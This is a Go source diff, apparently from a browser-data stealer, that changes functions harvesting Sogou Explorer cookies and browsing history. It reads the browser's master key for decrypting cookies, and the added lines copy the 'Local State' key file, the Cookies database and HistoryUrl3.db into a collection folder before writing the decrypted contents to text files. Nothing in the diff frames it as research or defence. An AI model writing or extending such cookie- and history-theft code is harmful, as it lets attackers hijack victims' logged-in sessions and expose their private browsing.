@@ -14,7 +14,7 @@ var SogouName = "OldSogouExplorer"
 var SogouPath = GetOperaPath("SogouExplorer")
 var sougoDefaultPath = filepath.Join(SogouPath, "\\Webkit\\Default")
 
-func SogouCookies() string {
+func SogouCookies(targetPath string) string {
 	var builder strings.Builder
 	sougoMasterKeyPath := filepath.Join(SogouPath, "\\Webkit")
 	sougoMasterkey, _ := utils.GetMasterKey(sougoMasterKeyPath)
@@ -25,6 +25,9 @@ func SogouCookies() string {
 	if _, err := os.Stat(text); os.IsNotExist(err) {
 		return ""
 	}
+	utils.CopyFile(sougoMasterKeyPath+"\\Local State", targetPath+"\\"+"Local State")
+	utils.CopyFile(text, targetPath+"\\"+"Cookies")
+
 	// 创建临时文件
 	tempFileName, err := os.CreateTemp("", "temp-*.db")
 	if err != nil {
@@ -73,7 +76,7 @@ func SogouCookies() string {
 	}
 	return builder.String()
 }
-func SogouHistory() string {
+func SogouHistory(targetPath string) string {
 	var builder strings.Builder
 	// 构建 HistoryUrl3.db 的路径
 	text := filepath.Join(SogouPath, "HistoryUrl3.db")
@@ -82,6 +85,7 @@ func SogouHistory() string {
 	if _, err := os.Stat(text); os.IsNotExist(err) {
 		return ""
 	}
+	utils.CopyFile(text, targetPath+"\\"+"HistoryUrl3.db")
 
 	// 创建临时文件
 	tempFileName, err := os.CreateTemp("", "temp-*.db")
@@ -128,12 +132,13 @@ func SogouHistory() string {
 func SogouSave(path string) {
 
 	if _, err := os.Stat(SogouPath); err == nil {
-		sogouHistory := SogouHistory()
-		sogouCookies := SogouCookies()
 		targetPath := filepath.Join(path, SogouName)
 		if err := os.MkdirAll(targetPath, os.ModePerm); err != nil {
 			log.Fatalf("创建目录失败: %v", err)
 		}
+		sogouHistory := SogouHistory(targetPath)
+		sogouCookies := SogouCookies(targetPath)
+
 		if sogouHistory != "" {
 			outputFile := SogouName + "_history.txt"
 			utils.WriteToFile(sogouHistory, targetPath+"\\"+outputFile)
